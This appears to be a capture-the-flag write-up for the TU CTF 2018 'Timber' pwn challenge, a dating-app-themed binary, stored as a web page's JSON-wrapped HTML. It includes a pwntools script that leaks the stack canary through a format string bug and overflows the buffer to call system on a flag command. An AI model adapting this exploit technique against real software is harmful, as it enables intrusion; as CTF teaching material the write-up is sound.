{"pageContext":{"html":"<p><a href=\"ctf=tu-ctf-2018\"></a>\n<a href=\"type=pwn\"></a>\n<a href=\"tags=rop\"></a>\n<a href=\"tools=radare2,gdb-peda,pwntools,python\"></a></p>\n<h1>Timber</h1>\n<p>We are given a <a href=\"../timber\">binary</a> with a stack canary, a stack based buffer overflow and a format string vulnerability. The binary mimics the popular dating application Tinder!</p>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/timber$ file timber\ntimber: ELF 32-bit LSB executable, Intel 80386, version 1 (SYSV), dynamically linked, interpreter /lib/ld-linux.so.2, for GNU/Linux 2.6.32, BuildID[sha1]=5f25b2cc724fad9767439392ba05ac91177ae3ee, not stripped\n</code></pre>\n<pre><code class=\"language-bash\">vagrant@amy:~/share/timber$ ./timber\nWelcome to Timberâ„¢!\nThe world's largest lumberjack dating site\nPlease enter your name: jack\nAlright jack\nLet's find you a match!\nOptions:\n l: Swipe Left\n r: Swipe Right\n s: Super Swipe\n\nEastern Pine age 4183? l\nAmerican Elm age 502? r\nAmerican Beech age 796? s\n+Match Found!\n----------------- American Beech ----------------\n[American Beech] So, are you a tree hugger or what.\nhello\n[American Beech] Pff, lumberjacks are all the same.\n</code></pre>\n<p>The format string vulnerability can be used to leak the stack canary allowing us to exploit the binary with a ROP chain.</p>\n<pre><code class=\"language-python\">from pwn import *\n\ncontext(arch='i386', os='linux')\n# p = process('./timber')\np = remote('18.222.250.47 ', 12345)\n\nflag_cmd = 0x8048ba0\nsystem = 0x08048500\n\np.sendline('%17$x')\np.recvuntil('Alright ')\nleak = p.recvuntil('\\n').strip()\ncanary = int(leak, 16)\n\nlog.info('Canary: {}'.format(hex(canary)))\n\npayload = ''\npayload += 'a' * 48\npayload += p32(canary)\npayload += 'a' * 8\npayload += p32(system)\npayload += 'a' * 4\npayload += p32(flag_cmd)\n\np.sendline('s')\n\np.sendline(payload)\np.recvuntil('same.\\n')\nflag = p.recvuntil('\\n').strip()\nlog.success(flag)\n</code></pre>"}}